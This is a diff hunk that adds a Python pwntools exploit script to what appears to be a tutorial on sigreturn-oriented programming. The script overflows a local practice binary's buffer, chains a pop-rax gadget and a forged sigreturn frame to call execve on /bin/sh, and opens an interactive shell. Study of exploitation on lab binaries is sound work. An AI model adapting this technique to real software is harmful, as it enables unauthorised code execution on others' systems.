@@ -479,3 +479,33 @@ _start:
 	syscall
 ```
 
+```py
+#!/usr/bin/python2
+from pwn import * 
+
+p = process("./srop", stdin=PTY)
+elf = ELF("./srop")
+context.arch = "amd64"
+
+padding = "A" * 72 # offset to overwrite RIP
+pop_rax = 0x401020
+id_sys_rt_sigretun = 15
+syscall = 0x40101b
+bin_sh = 0x402000
+
+def overwrite_signal_frame(bin_sh, syscall):
+    frame = SigreturnFrame() # crafts a sigreturn frame
+    frame.rax = constants.SYS_execve # 59 (id_syscall sys_execve) in RAX
+    frame.rdi = bin_sh # /bin/sh addr in RDI
+    frame.rip = syscall # syscall addr in RIP
+    return(frame)
+
+pld = padding 
+pld += p64(pop_rax)
+pld += p64(id_sys_rt_sigretun) 
+pld += p64(syscall) 
+pld += bytes(overwrite_signal_frame(bin_sh, syscall))
+
+p.sendline(pld) # send payload
+p.interactive() # spawn interactive shell
+```
